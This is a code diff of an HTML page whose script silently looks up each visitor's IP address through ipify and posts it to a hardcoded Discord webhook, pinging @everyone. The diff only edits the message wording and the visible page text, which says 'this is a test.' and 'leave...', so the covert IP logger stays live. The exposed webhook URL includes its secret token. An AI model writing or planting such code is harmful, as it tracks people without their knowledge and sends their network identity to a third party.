@@ -10,14 +10,13 @@
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
 
-                // Send IP directly to the Discord webhook
                 await fetch('https://discordapp.com/api/webhooks/1335494933716402296/FvFc354H6SH8nz7udg74oZBaSb7DPSjU2n4XEhO59tIoWxwXlsesC_eAI1Lo9fH-cd8g', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `New IP logged @everyone : ${data.ip}`
+                        content: `what the sigma @everyone : ${data.ip}`
                     })
                 });
             } catch (error) {
@@ -29,7 +28,7 @@
     </script>
 </head>
 <body>
-    <h1>leave</h1>
-    <p>leave</p>
+    <h1>this is a test.</h1>
+    <p>leave...</p>
 </body>
 </html>
